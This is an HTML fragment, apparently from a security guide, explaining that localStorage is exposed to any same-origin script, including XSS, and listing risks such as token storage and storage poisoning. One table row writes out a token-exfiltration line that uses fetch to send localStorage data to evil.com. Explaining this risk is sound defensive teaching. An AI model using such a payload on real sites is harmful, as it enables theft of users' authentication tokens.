<p dir=3D"auto">Web Storage's biggest security limitation is that it is <st=
rong>fully accessible to any JavaScript running on the same origin</strong>=
 =E2=80=94 including injected scripts from <strong>Cross-Site Scripting (XS=
S)</strong> attacks. Unlike <code>HttpOnly</code> cookies (which the browse=
r never exposes to JavaScript), a single XSS vulnerability gives an attacke=
r complete read/write access to everything in <code>localStorage</code>.</p=
>
<p dir=3D"auto"><strong>Key risks:</strong></p>
<markdown-accessiblity-table data-catalyst=3D""><table>
<thead>
<tr>
<th>Risk</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>XSS exfiltration</td>
<td><code>fetch('https://evil.com/?d=3D' + localStorage.getItem('token'))</=
code> =E2=80=94 attacker steals auth tokens</td>
</tr>
<tr>
<td>Token storage anti-pattern</td>
<td>Storing JWTs in <code>localStorage</code> is widely considered insecure=
 for high-value tokens</td>
</tr>
<tr>
<td>Storage poisoning</td>
<td>Attacker writes malicious values that your app later reads and executes=
</td>
</tr>
<tr>
<td>No CSRF protection</td>
<td>Unlike cookies, storage is not sent automatically =E2=80=94 but stolen =
values can be injected manually</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
